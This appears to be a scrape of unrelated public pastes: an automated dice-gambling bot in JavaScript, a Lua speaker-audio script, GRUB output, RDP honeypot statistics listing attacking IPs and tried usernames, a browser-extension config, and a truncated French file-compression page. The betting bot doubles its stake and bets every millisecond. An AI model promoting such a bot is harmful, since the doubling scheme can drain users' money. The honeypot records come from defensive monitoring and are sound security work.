------------------------------------------------------------------"
0UML2P7r,snowybot,coinwalk,JavaScript,Saturday 19th of August 2023 07:50:48 PM CDT,"var kozster = parseFloat($('#pct_balance').val());
var brick = kozster;
var gobbie = kozster/240; //basebet;
var zeggar = gobbie;
var target = 350;
var tens = (gobbie*10);
var sevens = (gobbie*6.9);
var tuba = ((Math.floor(kozster/tens))*tens);
var bitz = kozster;
var burgzie = kozster;
var belcom = kozster;
var love = kozster;
var lolz = gobbie*1000;
var bone = (((Math.floor(kozster/tens))*tens)-(tens*2));
var tubist = ((Math.floor(kozster/tens))*tens);
var razzle;
var zen = 0;
var upper = 6.9;
var lower = 2.9;
var junky = kozster;
var bonie = kozster;
var adst = (gobbie*1000).toPrecision(1).toString();
var blade = adst.length+1;
var joe = $($(""#me>div>.betid"")[0]).text();
var boggart = 0;
var bear = true;
var oldDegen = 0;
 
function dobet(){
burgzie = $('#pct_balance').val();
if (burgzie>(tuba+(zeggar*upper))){
    zeggar = zeggar*2;
    upper = 4.9;
    lower = 4.9;
    tuba = parseFloat(burgzie);
}
if (burgzie<(tuba-(zeggar*lower))){
    zeggar = zeggar*2;
    upper = 4.9;
    lower = 4.9;
    tuba = parseFloat(burgzie);
}
if ((zeggar>=(kozster/20))&&(burgzie<(((Math.floor(burgzie/tens))*tens)+sevens))){
    zeggar = gobbie;
    upper = 6.9;
    lower = 2.9;
    tuba = ((Math.floor(burgzie/tens))*tens);
}
return ((zeggar*1).toFixed(8));
}
 
function go(){
var xox = $('#pct_balance').val();
razzle = dobet();
$('#pct_chance').val(49.5);
$('#pct_bet').val(razzle);
$('#a_lo')[0].click();
console.log(""snowybot active"");
if (xox>=target) {
console.log(""snowybot rocks target done"");
return;
}
setTimeout(() => go(), 1);
}
go();
 "
zzNMNnKn,Untitled,LeParzival,Lua,Saturday 19th of August 2023 07:47:05 PM CDT,"local dfpwm = require ""cc.audio.dfpwm""

function playSong(speakers, data, volume)
    local decoder = dfpwm.make_decoder()
    local chunkSize = 16 * 1024

    for pos = 1, #data, chunkSize do
        local decodedFrame = decoder(data:sub(pos, pos + chunkSize - 1))

        -- try playing on each speaker
        for i, speaker in ipairs(speakers) do
            if not speaker.playAudio(decodedFrame, volume) then
                print(""[WARN] "" .. peripheral.getName(speaker) .. "" refused to accept frame #"" .. pos)
            end
        end

        local isDone = false
        while not isDone do
            local event, speakerName = os.pullEvent('speaker_audio_empty')
            if speakerName == peripheral.getName(speakers[1]) then isDone = true end
        end
    end
end

function initSpeakers(speakers)
    for i, speaker in ipairs(speakers) do
        speaker.stop()
    end
end


local url = ""https://stuff.parzival.space/cct/audio/casual_noob.dfpwm""
local frames = """"

local speakers = {peripheral.find(""speaker"")}
initSpeakers(speakers)
print(""Found "" .. #speakers .. "" connected speakers"")

print(""Downloading file..."")
local response, err = http.get(url, {}, true)
while true do
   local line = response.readLine(true)
   if not line then break end
   frames = frames .. line
end

print(""playing on all"")
playSong(speakers, frames, 1)"
u14MUFJe,grub,iconoclasthero,Bash,Saturday 19th of August 2023 07:24:20 PM CDT,"$ sudo os-prober; sudo update-grub
/dev/nvme0n1p1@/efi/Microsoft/Boot/bootmgfw.efi:Windows Boot Manager:Windows:efi
/dev/nvme0n1p5:Arch Linux (rolling):Arch:linux
Sourcing file `/etc/default/grub'
Sourcing file `/etc/default/grub.d/init-select.cfg'
Generating grub configuration file ...
Found linux image: /boot/vmlinuz-6.2.0-27-generic
Found initrd image: /boot/initrd.img-6.2.0-27-generic
Found memtest86+ 64bit EFI image: /@/boot/memtest86+x64.efi
Warning: os-prober will be executed to detect other bootable partitions.
Its output will be used to detect bootable binaries on them and create new boot entries.
Found Windows Boot Manager on /dev/nvme0n1p1@/efi/Microsoft/Boot/bootmgfw.efi
Found Arch Linux (rolling) on /dev/nvme0n1p5
Adding boot menu entry for UEFI Firmware Settings ...
done
"
qMsxcqMP,2023-08-19_stats.json,rdp_snitch,JSON,Saturday 19th of August 2023 07:17:56 PM CDT,"{
  ""ip"": {
    ""103.232.53.123"": 96,
    ""146.190.93.224"": 9,
    ""103.167.91.133"": 63,
    ""120.237.114.52"": 3,
    ""2.57.122.86"": 9,
    ""45.227.254.26"": 6,
    ""94.232.46.145"": 3,
    ""45.143.201.62"": 18,
    ""87.251.75.145"": 9,
    ""128.199.18.232"": 3,
    ""45.79.108.4"": 54,
    ""45.79.185.82"": 9,
    ""3.38.207.232"": 3,
    ""39.108.174.140"": 45,
    ""123.16.190.37"": 27,
    ""185.170.144.3"": 6,
    ""94.232.41.205"": 9,
    ""45.227.254.49"": 6,
    ""139.144.222.231"": 3,
    ""167.248.133.124"": 3,
    ""45.129.14.230"": 18,
    ""51.75.160.42"": 12,
    ""103.188.166.96"": 18,
    ""87.251.75.120"": 6,
    ""20.242.22.123"": 3,
    ""36.91.222.100"": 6,
    ""106.116.169.71"": 3,
    ""43.129.24.166"": 3,
    ""45.79.8.178"": 6,
    ""109.107.166.4"": 9,
    ""147.78.47.154"": 6,
    ""203.191.0.15"": 3,
    ""103.110.236.14"": 3,
    ""191.101.174.18"": 3,
    ""100.12.65.98"": 3,
    ""152.228.219.173"": 3,
    ""87.251.75.64"": 3,
    ""198.235.24.95"": 9,
    ""112.5.87.34"": 3,
    ""98.96.193.4"": 18,
    ""172.105.191.235"": 3,
    ""45.140.17.16"": 9,
    ""217.219.162.204"": 3,
    ""198.235.24.70"": 9,
    ""66.42.52.137"": 3,
    ""141.98.11.128"": 3,
    ""178.32.197.95"": 3
  },
  ""asn"": {
    ""AS63737"": 159,
    ""AS14061"": 12,
    ""AS56040"": 3,
    ""AS47890"": 9,
    ""AS267784"": 12,
    ""AS212482"": 3,
    ""AS210950"": 18,
    ""AS208091"": 27,
    ""AS63949"": 75,
    ""AS16509"": 3,
    ""AS37963"": 45,
    ""AS45899"": 27,
    ""AS48080"": 6,
    ""AS398722"": 3,
    ""AS198465"": 18,
    ""AS16276"": 18,
    ""AS149107"": 18,
    ""AS8075"": 3,
    ""AS7713"": 6,
    ""AS4134"": 3,
    ""AS132203"": 3,
    ""AS56380"": 9,
    ""AS209588"": 6,
    ""AS23724"": 3,
    ""AS134877"": 3,
    ""AS32780"": 3,
    ""AS701"": 3,
    ""AS396982"": 18,
    ""AS9808"": 3,
    ""AS21859"": 18,
    ""AS198953"": 9,
    ""AS58224"": 3,
    ""AS20473"": 3,
    ""AS209605"": 3
  },
  ""isp"": {
    ""VIETSERVER"": 96,
    ""DigitalOcean, LLC"": 12,
    ""Vietserver Services Technology Company Limited"": 63,
    ""China Mobile communications corporation"": 3,
    ""Unmanaged LTD"": 9,
    ""Flyservers S.A."": 18,
    ""Xhost Internet Solutions LP"": 30,
    ""TOV E-RISHENNYA"": 18,
    ""Akamai Technologies, Inc."": 72,
    ""Amazon.com, Inc."": 3,
    ""Hangzhou Alibaba Advertising Co"": 45,
    ""VNPT"": 27,
    ""Dmitriy Panchenko"": 6,
    ""Censys, Inc."": 3,
    ""BtHoster LTD"": 18,
    ""OVH SAS"": 18,
    ""Trumvps Company Limited"": 18,
    ""Microsoft Corporation"": 3,
    ""PT Telekomunikasi Indonesia"": 6,
    ""Chinanet"": 3,
    ""Shenzhen Tencent Computer Systems Company Limited"": 3,
    ""''IT FRUIT'' S.R.L."": 9,
    ""IDC, China Telecommunications Corporation"": 3,
    ""Hyperband"": 3,
    ""Hosting Services"": 3,
    ""Verizon Business"": 3,
    ""Google LLC"": 18,
    ""China Mobile"": 3,
    ""Zenlayer Inc"": 18,
    ""Akamai Technologies"": 3,
    ""Proton66 OOO"": 9,
    ""Iran Telecommunication Company PJS"": 3,
    ""Choopa"": 3,
    ""UAB Host Baltic"": 3
  },
  ""org"": {
    ""VietServer Services technology company limited"": 96,
    ""DigitalOcean, LLC"": 12,
    ""Vietserver Viet NAM Service Technology Company Limited"": 63,
    ""China Mobile"": 3,
    ""Pptechnology Limited"": 9,
    ""UAB Host Baltic"": 12,
    ""Dmitriy Panchenko"": 12,
    ""TOV VAIZ PARTNER"": 18,
    ""Xhost Internet Solutions"": 18,
    ""Linode"": 75,
    ""AWS EC2 (ap-northeast-2)"": 3,
    ""Aliyun Computing Co., LTD"": 45,
    ""Vietnam Posts and Telecommunications Group"": 27,
    ""Xhostis"": 6,
    ""Censys, Inc."": 3,
    ""BtHosting"": 18,
    ""OVH Ltd"": 12,
    ""TRUMVPS"": 18,
    ""Microsoft Azure Cloud (eastus2)"": 3,
    ""Telekomunikasi Indonesia"": 6,
    ""Chinanet HE"": 3,
    ""Tencent Cloud Computing"": 3,
    ""FOP Dmytro Nedilskyi"": 9,
    ""Flyservers S.A"": 6,
    ""Chinanet FJ"": 3,
    ""Unknown"": 9,
    ""Ipxo"": 3,
    ""Verizon Online LLC"": 3,
    ""OVH"": 3,
    ""Palo Alto Networks, Inc"": 18,
    ""China Mobile Communications Corporation"": 3,
    ""Zenlayer Inc"": 18,
    ""Proton66 LLC"": 9,
    ""Siub"": 3,
    ""ONYPHE"": 3
  },
  ""regionName"": {
    ""Hanoi"": 123,
    ""South West"": 12,
    ""Tinh Hung Yen"": 63,
    ""Guangdong"": 51,
    ""North Holland"": 15,
    ""Vilnius"": 12,
    ""Perm Krai"": 12,
    ""Kyiv City"": 18,
    ""England"": 30,
    ""Karnataka"": 3,
    ""California"": 72,
    ""New Jersey"": 12,
    ""Seoul"": 3,
    ""Moscow"": 15,
    ""Virginia"": 6,
    ""Michigan"": 3,
    ""Chi\u0219in\u0103u Municipality"": 18,
    ""Tinh Phu Tho"": 18,
    ""Jakarta"": 6,
    ""Hebei"": 3,
    ""Central and Western District"": 3,
    ""Texas"": 24,
    ""Raionul Soroca"": 9,
    ""Fujian"": 3,
    ""Tamil Nadu"": 3,
    ""New York"": 3,
    ""Hauts-de-France"": 6,
    ""New South Wales"": 3,
    ""M\u0101zandar\u0101n"": 3,
    ""Kaunas"": 3
  },
  ""country"": {
    ""Vietnam"": 204,
    ""Singapore"": 12,
    ""China"": 57,
    ""Netherlands"": 15,
    ""Lithuania"": 15,
    ""Russia"": 27,
    ""Ukraine"": 18,
    ""United Kingdom"": 30,
    ""India"": 6,
    ""United States"": 120,
    ""South Korea"": 3,
    ""Moldova"": 27,
    ""Indonesia"": 6,
    ""Hong Kong"": 3,
    ""France"": 6,
    ""Australia"": 3,
    ""Iran"": 3
  },
  ""account"": {
    ""hello"": 354,
    ""(empty)"": 21,
    ""nmap"": 3,
    ""Test"": 39,
    ""Administr"": 45,
    ""Domain"": 48,
    ""beio"": 6,
    ""DKmZRSjWl"": 3,
    ""bFIUsE"": 3,
    ""DBlGbZ"": 3,
    ""root"": 18,
    ""dGTTAhgfb"": 3,
    ""mWVxvP"": 3,
    ""RLlBfj"": 3,
    ""Administrator"": 3
  },
  ""keyboard"": {
    ""Unknown"": 555
  },
  ""client_build"": {
    ""Unknown"": 555
  },
  ""client_name"": {
    ""Unknown"": 555
  },
  ""ip_type"": {
    ""Unknown"": 345,
    ""hosting"": 198,
    ""mobile"": 6,
    ""proxy"": 3,
    ""hosting & proxy"": 3
  }
}"
6y3Dw4DP,2023-08-19_stats.json,rdp_snitch,JSON,Saturday 19th of August 2023 07:16:04 PM CDT,"{
  ""ip"": {
    ""103.232.53.123"": 64,
    ""146.190.93.224"": 6,
    ""103.167.91.133"": 42,
    ""120.237.114.52"": 2,
    ""2.57.122.86"": 6,
    ""45.227.254.26"": 4,
    ""94.232.46.145"": 2,
    ""45.143.201.62"": 12,
    ""87.251.75.145"": 6,
    ""128.199.18.232"": 2,
    ""45.79.108.4"": 36,
    ""45.79.185.82"": 6,
    ""3.38.207.232"": 2,
    ""39.108.174.140"": 30,
    ""123.16.190.37"": 18,
    ""185.170.144.3"": 4,
    ""94.232.41.205"": 6,
    ""45.227.254.49"": 4,
    ""139.144.222.231"": 2,
    ""167.248.133.124"": 2,
    ""45.129.14.230"": 12,
    ""51.75.160.42"": 8,
    ""103.188.166.96"": 12,
    ""87.251.75.120"": 4,
    ""20.242.22.123"": 2,
    ""36.91.222.100"": 4,
    ""106.116.169.71"": 2,
    ""43.129.24.166"": 2,
    ""45.79.8.178"": 4,
    ""109.107.166.4"": 6,
    ""147.78.47.154"": 4,
    ""203.191.0.15"": 2,
    ""103.110.236.14"": 2,
    ""191.101.174.18"": 2,
    ""100.12.65.98"": 2,
    ""152.228.219.173"": 2,
    ""87.251.75.64"": 2,
    ""198.235.24.95"": 6,
    ""112.5.87.34"": 2,
    ""98.96.193.4"": 12,
    ""172.105.191.235"": 2,
    ""45.140.17.16"": 6,
    ""217.219.162.204"": 2,
    ""198.235.24.70"": 6,
    ""66.42.52.137"": 2,
    ""141.98.11.128"": 2,
    ""178.32.197.95"": 2
  },
  ""asn"": {
    ""AS63737"": 106,
    ""AS14061"": 8,
    ""AS56040"": 2,
    ""AS47890"": 6,
    ""AS267784"": 8,
    ""AS212482"": 2,
    ""AS210950"": 12,
    ""AS208091"": 18,
    ""AS63949"": 50,
    ""AS16509"": 2,
    ""AS37963"": 30,
    ""AS45899"": 18,
    ""AS48080"": 4,
    ""AS398722"": 2,
    ""AS198465"": 12,
    ""AS16276"": 12,
    ""AS149107"": 12,
    ""AS8075"": 2,
    ""AS7713"": 4,
    ""AS4134"": 2,
    ""AS132203"": 2,
    ""AS56380"": 6,
    ""AS209588"": 4,
    ""AS23724"": 2,
    ""AS134877"": 2,
    ""AS32780"": 2,
    ""AS701"": 2,
    ""AS396982"": 12,
    ""AS9808"": 2,
    ""AS21859"": 12,
    ""AS198953"": 6,
    ""AS58224"": 2,
    ""AS20473"": 2,
    ""AS209605"": 2
  },
  ""isp"": {
    ""VIETSERVER"": 64,
    ""DigitalOcean, LLC"": 8,
    ""Vietserver Services Technology Company Limited"": 42,
    ""China Mobile communications corporation"": 2,
    ""Unmanaged LTD"": 6,
    ""Flyservers S.A."": 12,
    ""Xhost Internet Solutions LP"": 20,
    ""TOV E-RISHENNYA"": 12,
    ""Akamai Technologies, Inc."": 48,
    ""Amazon.com, Inc."": 2,
    ""Hangzhou Alibaba Advertising Co"": 30,
    ""VNPT"": 18,
    ""Dmitriy Panchenko"": 4,
    ""Censys, Inc."": 2,
    ""BtHoster LTD"": 12,
    ""OVH SAS"": 12,
    ""Trumvps Company Limited"": 12,
    ""Microsoft Corporation"": 2,
    ""PT Telekomunikasi Indonesia"": 4,
    ""Chinanet"": 2,
    ""Shenzhen Tencent Computer Systems Company Limited"": 2,
    ""''IT FRUIT'' S.R.L."": 6,
    ""IDC, China Telecommunications Corporation"": 2,
    ""Hyperband"": 2,
    ""Hosting Services"": 2,
    ""Verizon Business"": 2,
    ""Google LLC"": 12,
    ""China Mobile"": 2,
    ""Zenlayer Inc"": 12,
    ""Akamai Technologies"": 2,
    ""Proton66 OOO"": 6,
    ""Iran Telecommunication Company PJS"": 2,
    ""Choopa"": 2,
    ""UAB Host Baltic"": 2
  },
  ""org"": {
    ""VietServer Services technology company limited"": 64,
    ""DigitalOcean, LLC"": 8,
    ""Vietserver Viet NAM Service Technology Company Limited"": 42,
    ""China Mobile"": 2,
    ""Pptechnology Limited"": 6,
    ""UAB Host Baltic"": 8,
    ""Dmitriy Panchenko"": 8,
    ""TOV VAIZ PARTNER"": 12,
    ""Xhost Internet Solutions"": 12,
    ""Linode"": 50,
    ""AWS EC2 (ap-northeast-2)"": 2,
    ""Aliyun Computing Co., LTD"": 30,
    ""Vietnam Posts and Telecommunications Group"": 18,
    ""Xhostis"": 4,
    ""Censys, Inc."": 2,
    ""BtHosting"": 12,
    ""OVH Ltd"": 8,
    ""TRUMVPS"": 12,
    ""Microsoft Azure Cloud (eastus2)"": 2,
    ""Telekomunikasi Indonesia"": 4,
    ""Chinanet HE"": 2,
    ""Tencent Cloud Computing"": 2,
    ""FOP Dmytro Nedilskyi"": 6,
    ""Flyservers S.A"": 4,
    ""Chinanet FJ"": 2,
    ""Unknown"": 6,
    ""Ipxo"": 2,
    ""Verizon Online LLC"": 2,
    ""OVH"": 2,
    ""Palo Alto Networks, Inc"": 12,
    ""China Mobile Communications Corporation"": 2,
    ""Zenlayer Inc"": 12,
    ""Proton66 LLC"": 6,
    ""Siub"": 2,
    ""ONYPHE"": 2
  },
  ""regionName"": {
    ""Hanoi"": 82,
    ""South West"": 8,
    ""Tinh Hung Yen"": 42,
    ""Guangdong"": 34,
    ""North Holland"": 10,
    ""Vilnius"": 8,
    ""Perm Krai"": 8,
    ""Kyiv City"": 12,
    ""England"": 20,
    ""Karnataka"": 2,
    ""California"": 48,
    ""New Jersey"": 8,
    ""Seoul"": 2,
    ""Moscow"": 10,
    ""Virginia"": 4,
    ""Michigan"": 2,
    ""Chi\u0219in\u0103u Municipality"": 12,
    ""Tinh Phu Tho"": 12,
    ""Jakarta"": 4,
    ""Hebei"": 2,
    ""Central and Western District"": 2,
    ""Texas"": 16,
    ""Raionul Soroca"": 6,
    ""Fujian"": 2,
    ""Tamil Nadu"": 2,
    ""New York"": 2,
    ""Hauts-de-France"": 4,
    ""New South Wales"": 2,
    ""M\u0101zandar\u0101n"": 2,
    ""Kaunas"": 2
  },
  ""country"": {
    ""Vietnam"": 136,
    ""Singapore"": 8,
    ""China"": 38,
    ""Netherlands"": 10,
    ""Lithuania"": 10,
    ""Russia"": 18,
    ""Ukraine"": 12,
    ""United Kingdom"": 20,
    ""India"": 4,
    ""United States"": 80,
    ""South Korea"": 2,
    ""Moldova"": 18,
    ""Indonesia"": 4,
    ""Hong Kong"": 2,
    ""France"": 4,
    ""Australia"": 2,
    ""Iran"": 2
  },
  ""account"": {
    ""hello"": 236,
    ""(empty)"": 14,
    ""nmap"": 2,
    ""Test"": 26,
    ""Administr"": 30,
    ""Domain"": 32,
    ""beio"": 4,
    ""DKmZRSjWl"": 2,
    ""bFIUsE"": 2,
    ""DBlGbZ"": 2,
    ""root"": 12,
    ""dGTTAhgfb"": 2,
    ""mWVxvP"": 2,
    ""RLlBfj"": 2,
    ""Administrator"": 2
  },
  ""keyboard"": {
    ""Unknown"": 370
  },
  ""client_build"": {
    ""Unknown"": 370
  },
  ""client_name"": {
    ""Unknown"": 370
  },
  ""ip_type"": {
    ""Unknown"": 230,
    ""hosting"": 132,
    ""mobile"": 4,
    ""proxy"": 2,
    ""hosting & proxy"": 2
  }
}"
8i6t7eus,2023-08-19_stats.json,rdp_snitch,JSON,Saturday 19th of August 2023 07:15:08 PM CDT,"{
  ""ip"": {
    ""103.232.53.123"": 32,
    ""146.190.93.224"": 3,
    ""103.167.91.133"": 21,
    ""120.237.114.52"": 1,
    ""2.57.122.86"": 3,
    ""45.227.254.26"": 2,
    ""94.232.46.145"": 1,
    ""45.143.201.62"": 6,
    ""87.251.75.145"": 3,
    ""128.199.18.232"": 1,
    ""45.79.108.4"": 18,
    ""45.79.185.82"": 3,
    ""3.38.207.232"": 1,
    ""39.108.174.140"": 15,
    ""123.16.190.37"": 9,
    ""185.170.144.3"": 2,
    ""94.232.41.205"": 3,
    ""45.227.254.49"": 2,
    ""139.144.222.231"": 1,
    ""167.248.133.124"": 1,
    ""45.129.14.230"": 6,
    ""51.75.160.42"": 4,
    ""103.188.166.96"": 6,
    ""87.251.75.120"": 2,
    ""20.242.22.123"": 1,
    ""36.91.222.100"": 2,
    ""106.116.169.71"": 1,
    ""43.129.24.166"": 1,
    ""45.79.8.178"": 2,
    ""109.107.166.4"": 3,
    ""147.78.47.154"": 2,
    ""203.191.0.15"": 1,
    ""103.110.236.14"": 1,
    ""191.101.174.18"": 1,
    ""100.12.65.98"": 1,
    ""152.228.219.173"": 1,
    ""87.251.75.64"": 1,
    ""198.235.24.95"": 3,
    ""112.5.87.34"": 1,
    ""98.96.193.4"": 6,
    ""172.105.191.235"": 1,
    ""45.140.17.16"": 3,
    ""217.219.162.204"": 1,
    ""198.235.24.70"": 3,
    ""66.42.52.137"": 1,
    ""141.98.11.128"": 1,
    ""178.32.197.95"": 1
  },
  ""asn"": {
    ""AS63737"": 53,
    ""AS14061"": 4,
    ""AS56040"": 1,
    ""AS47890"": 3,
    ""AS267784"": 4,
    ""AS212482"": 1,
    ""AS210950"": 6,
    ""AS208091"": 9,
    ""AS63949"": 25,
    ""AS16509"": 1,
    ""AS37963"": 15,
    ""AS45899"": 9,
    ""AS48080"": 2,
    ""AS398722"": 1,
    ""AS198465"": 6,
    ""AS16276"": 6,
    ""AS149107"": 6,
    ""AS8075"": 1,
    ""AS7713"": 2,
    ""AS4134"": 1,
    ""AS132203"": 1,
    ""AS56380"": 3,
    ""AS209588"": 2,
    ""AS23724"": 1,
    ""AS134877"": 1,
    ""AS32780"": 1,
    ""AS701"": 1,
    ""AS396982"": 6,
    ""AS9808"": 1,
    ""AS21859"": 6,
    ""AS198953"": 3,
    ""AS58224"": 1,
    ""AS20473"": 1,
    ""AS209605"": 1
  },
  ""isp"": {
    ""VIETSERVER"": 32,
    ""DigitalOcean, LLC"": 4,
    ""Vietserver Services Technology Company Limited"": 21,
    ""China Mobile communications corporation"": 1,
    ""Unmanaged LTD"": 3,
    ""Flyservers S.A."": 6,
    ""Xhost Internet Solutions LP"": 10,
    ""TOV E-RISHENNYA"": 6,
    ""Akamai Technologies, Inc."": 24,
    ""Amazon.com, Inc."": 1,
    ""Hangzhou Alibaba Advertising Co"": 15,
    ""VNPT"": 9,
    ""Dmitriy Panchenko"": 2,
    ""Censys, Inc."": 1,
    ""BtHoster LTD"": 6,
    ""OVH SAS"": 6,
    ""Trumvps Company Limited"": 6,
    ""Microsoft Corporation"": 1,
    ""PT Telekomunikasi Indonesia"": 2,
    ""Chinanet"": 1,
    ""Shenzhen Tencent Computer Systems Company Limited"": 1,
    ""''IT FRUIT'' S.R.L."": 3,
    ""IDC, China Telecommunications Corporation"": 1,
    ""Hyperband"": 1,
    ""Hosting Services"": 1,
    ""Verizon Business"": 1,
    ""Google LLC"": 6,
    ""China Mobile"": 1,
    ""Zenlayer Inc"": 6,
    ""Akamai Technologies"": 1,
    ""Proton66 OOO"": 3,
    ""Iran Telecommunication Company PJS"": 1,
    ""Choopa"": 1,
    ""UAB Host Baltic"": 1
  },
  ""org"": {
    ""VietServer Services technology company limited"": 32,
    ""DigitalOcean, LLC"": 4,
    ""Vietserver Viet NAM Service Technology Company Limited"": 21,
    ""China Mobile"": 1,
    ""Pptechnology Limited"": 3,
    ""UAB Host Baltic"": 4,
    ""Dmitriy Panchenko"": 4,
    ""TOV VAIZ PARTNER"": 6,
    ""Xhost Internet Solutions"": 6,
    ""Linode"": 25,
    ""AWS EC2 (ap-northeast-2)"": 1,
    ""Aliyun Computing Co., LTD"": 15,
    ""Vietnam Posts and Telecommunications Group"": 9,
    ""Xhostis"": 2,
    ""Censys, Inc."": 1,
    ""BtHosting"": 6,
    ""OVH Ltd"": 4,
    ""TRUMVPS"": 6,
    ""Microsoft Azure Cloud (eastus2)"": 1,
    ""Telekomunikasi Indonesia"": 2,
    ""Chinanet HE"": 1,
    ""Tencent Cloud Computing"": 1,
    ""FOP Dmytro Nedilskyi"": 3,
    ""Flyservers S.A"": 2,
    ""Chinanet FJ"": 1,
    ""Unknown"": 3,
    ""Ipxo"": 1,
    ""Verizon Online LLC"": 1,
    ""OVH"": 1,
    ""Palo Alto Networks, Inc"": 6,
    ""China Mobile Communications Corporation"": 1,
    ""Zenlayer Inc"": 6,
    ""Proton66 LLC"": 3,
    ""Siub"": 1,
    ""ONYPHE"": 1
  },
  ""regionName"": {
    ""Hanoi"": 41,
    ""South West"": 4,
    ""Tinh Hung Yen"": 21,
    ""Guangdong"": 17,
    ""North Holland"": 5,
    ""Vilnius"": 4,
    ""Perm Krai"": 4,
    ""Kyiv City"": 6,
    ""England"": 10,
    ""Karnataka"": 1,
    ""California"": 24,
    ""New Jersey"": 4,
    ""Seoul"": 1,
    ""Moscow"": 5,
    ""Virginia"": 2,
    ""Michigan"": 1,
    ""Chi\u0219in\u0103u Municipality"": 6,
    ""Tinh Phu Tho"": 6,
    ""Jakarta"": 2,
    ""Hebei"": 1,
    ""Central and Western District"": 1,
    ""Texas"": 8,
    ""Raionul Soroca"": 3,
    ""Fujian"": 1,
    ""Tamil Nadu"": 1,
    ""New York"": 1,
    ""Hauts-de-France"": 2,
    ""New South Wales"": 1,
    ""M\u0101zandar\u0101n"": 1,
    ""Kaunas"": 1
  },
  ""country"": {
    ""Vietnam"": 68,
    ""Singapore"": 4,
    ""China"": 19,
    ""Netherlands"": 5,
    ""Lithuania"": 5,
    ""Russia"": 9,
    ""Ukraine"": 6,
    ""United Kingdom"": 10,
    ""India"": 2,
    ""United States"": 40,
    ""South Korea"": 1,
    ""Moldova"": 9,
    ""Indonesia"": 2,
    ""Hong Kong"": 1,
    ""France"": 2,
    ""Australia"": 1,
    ""Iran"": 1
  },
  ""account"": {
    ""hello"": 118,
    ""(empty)"": 7,
    ""nmap"": 1,
    ""Test"": 13,
    ""Administr"": 15,
    ""Domain"": 16,
    ""beio"": 2,
    ""DKmZRSjWl"": 1,
    ""bFIUsE"": 1,
    ""DBlGbZ"": 1,
    ""root"": 6,
    ""dGTTAhgfb"": 1,
    ""mWVxvP"": 1,
    ""RLlBfj"": 1,
    ""Administrator"": 1
  },
  ""keyboard"": {
    ""Unknown"": 185
  },
  ""client_build"": {
    ""Unknown"": 185
  },
  ""client_name"": {
    ""Unknown"": 185
  },
  ""ip_type"": {
    ""Unknown"": 115,
    ""hosting"": 66,
    ""mobile"": 2,
    ""proxy"": 1,
    ""hosting & proxy"": 1
  }
}"
jsD9e5hx,surfing keys config,jpsala,JavaScript,Saturday 19th of August 2023 06:51:26 PM CDT,"api.map('<Ctrl-i>', '<Alt-s>');
api.map('c', 'i');
api.mapkey('<Space>', 'Choose a tab with omnibar', function() {
    api.Front.openOmnibar({type: ""Tabs""});
})
api.mapkey(""<Space>"", ""pause/resume on youtube"", function() {
    var btn = document.querySelector(""button.ytp-ad-overlay-close-button"") || document.querySelector(""button.ytp-ad-skip-button"") || document.querySelector('ytd-watch-flexy button.ytp-play-button');
    btn.click();
}, {domain: /youtube.com/i})"
zUtcBwie,PakFiles.html,Thunder-Menu,HTML,Saturday 19th of August 2023 06:33:54 PM CDT,"<!DOCTYPE html>
<html lang=""fr"">
<head>
    <meta charset=""UTF-8"">
    <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">
    <title>Compression et Compressor de Fichiers</title>
    <script src=""https://cdnjs.cloudflare.com/ajax/libs/jszip/3.1.5/jszip.min.js""></script>
</head>
<body>
    <select id=""operationSelect"">
        <option value=""pakobest"" selected>best compressor</option>
        <option value=""compress"">Compresser</option>
        <option value=""encode"">Encodage</option>
        <option value=""decode"">Décodage</option>
    </select>

    <div id=""compressSection"" style=""display: none;"">
        <h2>Compression de Fichiers</h2>
        <input type=""file"" id=""fileInput"" multiple>
        <br>
        <button id=""compressButton"" disabled>Compresser et Enregistrer</button>
    </div>

    <div id=""encodeSection"" style=""display: none;"">
        <h2>Générateur de Motif de Carrés - Encodage</h2>
        <input type=""file"" id=""encodeFileInput"" style=""display: none;"">
        <br>
        <button id=""loadButton"">Sélectionner un fichier</button>
        <br>
        <button id=""generateButton"" disabled>Générer</button>
        <br>
        <button id=""saveButton"" disabled>Enregistrer le motif</button>
        <br>
        <textarea id=""textBox"" rows=""10"" cols=""50""></textarea>
        <br>
        <div id=""encodePictureBox""></div>
    </div>

    <div id=""decodeSection"" style=""display: none;"">
        <h2>Générateur de Motif de Carrés - Décodage</h2>
        <input type=""file"" id=""decodeFileInput"" class=""button"">
        <br>
        <button id=""decodeGenerateButton"" class=""button"" disabled>Générer</button>
        <br>
        <button id=""decodeSaveButton"" class=""button"" style=""display: none;"">Enregistrer</button>
        <br>
        <textarea id=""decodeTextBox"" rows=""10"" cols=""50"" style=""margin-top: 20px;"" readonly></textarea>
        <br>
        <canvas id=""decodePictureBox""></canvas>
    </div>

    <div id=""fileCompressorSection"" style=""display: none;"">
        <h2>File Compressor</h2>
        <select id=""fileComboBox"" size=""10""></select>
        <br>
        <button onclick=""addFilesToComboBox()"">Choisir des fichiers</button>
        <br>
        <input type=""file"" id=""folderInput"" multiple directory="""" webkitdirectory="""" style=""display: none;"" onchange=""addFoldersToComboBox()"">
        <button onclick=""document.getElementById('folderInput').click()"">Choisir un dossier</button>
        <br>
        <button onclick=""clearSelectedItems()"">Effacer</button>
        <br>
        <button onclick=""compressAndSave()"">Compresser et Enregistrer</button>
        <br>
        <select id=""compressionComboBox"">
            <option value=""best"">Best</option>
            <option value=""store"">Store</option>
            <option value=""normal"">Normal</option>
            <option value=""maximum"">Maximum</option>
        </select>
        <br>
        <select id=""extensionComboBox"">
            <option value=""zip"">.zip</option>
            <option value=""rar"">.rar</option>
            <option value=""iso"">.iso</option>
        </select>
    </div>

    <script src=""https://code.jquery.com/jquery-3.6.0.min.js""></script>

    <script>
        let selectedFiles = [];

        function addFilesToComboBox() {
            const fileInput = document.createElement(""input"");
            fileInput.type = ""file"";
            fileInput.multiple = true;
            fileInput.onchange = function () {
                const fileComboBox = document.getElementById(""fileComboBox"");

                for (let i = 0; i < fileInput.files.length; i++) {
                    selectedFiles.push(fileInput.files[i]);

                    const option = document.createElement(""option"");
                    option.text = fileInput.files[i].name;
                    fileComboBox.add(option);
                }
            };
            fileInput.click();
        }

        function addFoldersToComboBox() {
            const folderInput = document.getElementById(""folderInput"");
            const fileComboBox = document.getElementById(""fileComboBox"");

            for (let i = 0; i < folderInput.files.length; i++) {
                traverseDirectory(folderInput.files[i], """");
            }
        }

        async function traverseDirectory(item, parentPath) {
            if (item.isDirectory) {
                const reader = item.createReader();
                const entries = await reader.readEntries();
                for (const entry of entries) {
                    const fullPath = `${parentPath}/${entry.name}`;
                    traverseDirectory(entry, fullPath);
                }
            } else {
                selectedFiles.push(item);

